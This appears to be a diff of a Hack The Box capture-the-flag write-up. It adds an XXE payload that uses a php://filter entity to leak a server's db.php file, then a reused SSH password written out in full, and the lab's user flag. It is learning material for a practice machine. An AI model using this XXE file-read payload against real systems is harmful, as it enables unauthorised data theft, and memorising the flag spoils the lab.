@@ -45,14 +45,17 @@ Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0f7b0715-f102-44ff-b71f-03dc15d99366)
 
 
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a36e25bd-c459-480d-be95-2b4864740626)
-
-
-
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3150f267-374d-4dd8-937c-5486ea6e4577)
 
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a36e25bd-c459-480d-be95-2b4864740626)
 
+
+#### NOTES:
+
+```
+Can't access db.php file, dunno why even though the status code is 200. 
+```
 
 4. Let's start by sending random data and intercept the request using burpsuite.
 
@@ -112,12 +115,55 @@ Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0cea2752-0ecb-4f74-adee-0d95b3d43c3d)
 
 
-11. Remembering that this is an Apache's server and it stores data, hence we can leak database file at `/var/www/html`.
+11. Remembering that this is an Apache's server and it stores data, hence we can leak database file at `/var/www/html`. But again, for safety, we need to encode the result in base64 so there are no chars missing.
+
+> COMMAND
+
+```
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
+```
+
+> FULL PAYLOAD
+
+```
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
+<bugreport>
+<title>aa</title>
+	<cwe>&file;</cwe>
+	<cvss>aaaa</cvss>
+	<reward>80000</reward>
+</bugreport>
+```
+
 
 > RESULT
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8d6aafd9-41ab-466a-ba93-dad92ec14a79)
 
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c97a03f6-1872-4e89-96be-e4b4b7bdb0c4)
+
+
+12. Ok, there is an assumption of `possibilites of password reuse`. Let's try run ssh to the remote server, set the username as development, and password as --> m19RoAU0hP41A1sTsq6K.
+
+> RESULT - WE LOGGED IN
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/84736ebc-75a0-4554-b0f9-9092de21ffa7)
+
+
+> GETTING USER FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7204a05d-b100-4b65-bbf6-1b41f5a960ba)
+
+
+## USER FLAG
+
+```
+312798040985116fe3baac54ab9f0c36
+```
 
 
 
